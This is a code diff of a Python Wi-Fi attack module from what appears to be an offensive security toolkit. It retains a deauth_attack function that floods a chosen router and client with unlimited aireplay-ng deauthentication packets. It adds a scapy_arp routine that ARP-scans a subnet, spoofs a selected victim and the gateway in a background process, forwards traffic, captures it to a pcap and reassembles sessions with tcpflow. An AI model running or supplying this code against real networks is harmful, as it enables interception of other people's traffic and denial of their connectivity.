@@ -3,11 +3,16 @@
 '''
 
 import logging
-import re
 import sys
-from typing import List, Union
+from multiprocessing.context import Process
+from typing import Union
 
+import verboselogs
+
+from ..utils.defaultLogBanner import log_runBanner
 from ..utils.utils import Context, Utils
+from ..utils.utilsHelper import prompt_sudo
+from ..utils.utilsWifi import UtilsWifi
 
 # ------------------------------------------------------------------------------
 #
@@ -17,10 +22,6 @@ from ..utils.utils import Context, Utils
 
 
 class WiFiService:
-
-    # Regular Expressions to be used.
-    mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
-    wlan_code = re.compile('Interface (wlan[0-9]+|wlp[0-9]+s[0-9]+)')
 
     # --------------------------------------------------------------------------
     #
@@ -46,62 +47,6 @@ class WiFiService:
     #
     # --------------------------------------------------------------------------
 
-    def find_nic(self) -> Union[List[str], None]:
-        '''
-            This function is used to find the network interface controllers on your computer.
-        '''
-        # We use the subprocess.run to run the 'sudo iw dev' command we'd normally run to find the network interfaces.
-        result = self.utils.run_command_output_loop('find nic', [['iw', 'dev']])
-        if result is not None:
-            network_interface_controllers = self.wlan_code.findall(result)
-            return network_interface_controllers
-        return None
-
-    def set_monitor_mode(self, wifi_name):
-        '''
-            This function needs the network interface controller name to put it into monitor mode.
-            Argument: wifi_name => Network Controller Name
-        '''
-        # Put WiFi controller into monitor mode.
-        # This is one way to put it into monitoring mode. You can also use iwconfig, or airmon-ng.
-        self.utils.run_command_output_loop('monitor mode (down)', [['ip', 'link', 'set', wifi_name, 'down']])
-        # Killing conflicting processes makes sure that nothing interferes with putting controller into monitor mode.
-        self.utils.run_command_output_loop('monitor mode (kill)', [['airmon-ng', 'check', 'kill']])
-        # Put the WiFi nic in monitor mode.
-        self.utils.run_command_output_loop('monitor mode (set)', [['iw', wifi_name, 'set', 'monitor', 'none']])
-        # Bring the WiFi controller back online.
-        self.utils.run_command_output_loop('monitor mode (up)', [['ip', 'link', 'set', wifi_name, 'up']])
-
-    def set_band_to_monitor(self, choice, wifi_name):
-        '''
-            If you have a 5Ghz network interface controller you can use this function to put monitor either 2.4Ghz or 5Ghz bands or both.
-        '''
-        if choice == '0':
-            # Bands b and g are 2.4Ghz WiFi Networks
-            self.utils.run_command_output_loop('band (bg)', [['airodump-ng', '--band', 'bg', '-w', 'file',
-                                               '--write-interval', '1', '--output-format', 'csv', wifi_name]])
-        elif choice == '1':
-            # Band a is for 5Ghz WiFi Networks
-            self.utils.run_command_output_loop('band (a)', [['airodump-ng', '--band', 'a', '-w', 'file',
-                                               '--write-interval', '1', '--output-format', 'csv', wifi_name]])
-        else:
-            # Will use bands a, b and g (actually band n). Checks full spectrum.
-            self.utils.run_command_output_loop('band (abg)', [['airodump-ng', '--band', 'abg', '-w', 'file',
-                                               '--write-interval', '1', '--output-format', 'csv', wifi_name]])
-
-    def set_into_managed_mode(self, wifi_name):
-        '''
-            SET YOUR NETWORK CONTROLLER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
-            ARGUMENTS: wifi interface name
-        '''
-        # Put WiFi controller into monitor mode.
-        # This is one way to put it into managed mode. You can also use iwconfig, or airmon-ng.
-        self.utils.run_command_output_loop('manage mode (down', [['ip', 'link', 'set', wifi_name, 'down']])
-        # Put the WiFi nic in monitor mode.
-        self.utils.run_command_output_loop('manage mode (set)', [['iwconfig', wifi_name, 'mode', 'managed']])
-        self.utils.run_command_output_loop('manage mode (up)', [['ip', 'link', 'set', wifi_name, 'up']])
-        self.utils.run_command_output_loop('manage mode (start)', [['service', 'NetworkManager', 'start']])
-
     def get_clients(self, hackbssid, hackchannel, wifi_name):
         self.utils.run_command_output_loop('get clients', [['airodump-ng', '--bssid', hackbssid, '--channel', hackchannel, '-w',
                                                            'clients', '--write-interval', '1', '--output-format', 'csv', wifi_name]])
@@ -109,7 +54,8 @@ class WiFiService:
     def deauth_attack(self, network_mac, target_mac, interface):
         # We are using aireplay-ng to send a deauth packet. 0 means it will send it indefinitely. -a is used to specify the MAC address of the target router. -c is used to specify the mac we want to send the deauth packet.
         # Then we also need to specify the interface
-        self.utils.run_command_output_loop('deauth atack', [['aireplay-ng', '--deauth', '0', '-a', network_mac, '-c', target_mac, interface]])
+        self.utils.run_command_output_loop(
+            'deauth atack', [['aireplay-ng', '--deauth', '0', '-a', network_mac, '-c', target_mac, interface]])
 
     def run_airmon(self, wifi_name, hackchannel):
         # Make sure that airmon-ng is running on the correct channel.
@@ -121,3 +67,85 @@ class WiFiService:
     #
     #
     # --------------------------------------------------------------------------
+
+    def scapy_arp(self, net: str):
+        '''
+            ...
+        '''
+        service_name: str = 'SCAPY_ARP'
+        log_runBanner(service_name)
+        path = self.utils.create_service_folder(f'wifi/arp', net)
+
+        utilsWifi: Union[UtilsWifi, None] = None
+        t1: Union[Process, None] = None
+        pcap_filename: str = None
+        try:
+            if not prompt_sudo():
+                raise KeyboardInterrupt("not in sudo mode")
+
+            utilsWifi = UtilsWifi(self.utils)
+
+            if not utilsWifi.validate_ip(net):
+                logging.log(logging.WARNING, "No valid ip range specified")
+            else:
+                # If we don't run this function the internet will be down for the user.
+                utilsWifi.activate_ip_forwarding()
+                # Do the arp scan. The function returns a list of all clients.
+                arp_res = utilsWifi.scan_arp(net)
+
+                # If there is no connection exit the script.
+                if arp_res is None or len(arp_res) == 0:
+                    logging.log(logging.WARNING, "No connection. Exiting, make sure devices are active or turned on.")
+                    raise KeyboardInterrupt("no connection")
+                else:
+                    # The function runs route -n command. Returns a list with the gateway in a dictionary.
+                    gateways = utilsWifi.gateway_info(arp_res)
+
+                    if gateways is None:
+                        logging.log(logging.WARNING, "No gatewas found")
+                        raise KeyboardInterrupt("no connection")
+                    else:
+                        # The gateways are removed from the clients.
+                        client_info = utilsWifi.get_clients(arp_res, gateways)
+
+                        # If there are no clients, then the program will exit from here.
+                        if len(client_info) == 0:
+                            logging.log(
+                                logging.WARNING, "No clients found when sending the ARP messages. Exiting, make sure devices are active or turned on.")
+                            exit()
+
+                        # Show the  menu and assign the choice from the function to the variable -> choice
+                        choice = utilsWifi.print_arp_res(client_info)
+
+                        # Select the node to spoof from the client_info list.
+                        node_to_spoof = client_info[choice]
+
+                        if node_to_spoof is not None and gateways is not None and gateways[0] is not None:
+                            # Setup the thread in the background which will send the arp spoof packets.
+                            t1 = Process(target=utilsWifi.send_spoof_packets, args=[
+                                gateways[0], node_to_spoof], daemon=True)
+                            if t1 is not None:
+                                # Start the thread.
+                                t1.start()
+                                # Run the packet sniffer on the interface. So we can capture all the packets and save it to a pcap file that can be opened in Wireshark.
+                                pcap_filename = f'snoop_{node_to_spoof.get("ip")}'
+                                utilsWifi.packet_sniffer(interface=gateways[0]["iface"],
+                                                         path=path, filename=pcap_filename)
+        except (KeyboardInterrupt, SystemExit):
+            pass
+        except Exception as e:
+            logging.log(logging.CRITICAL, e, exc_info=True)
+
+        if pcap_filename is not None:
+            self.utils.run_command_output_loop('pcap tcpflow', [
+                ['tcpflow', '-r', f'{path}/{pcap_filename}.pcap', '-o', path]
+            ])
+            logging.log(verboselogs.SUCCESS, f'[*] {service_name} Done! View the log reports under {path}/')
+
+        if t1 is not None:
+            t1.terminate()
+            logging.log(logging.INFO, 'waiting for thread ending...')
+            t1.join()
+            logging.log(logging.INFO, '... thread finish, ending rest...')
+        if utilsWifi is not None:
+            utilsWifi.deactivate_ip_forwarding()
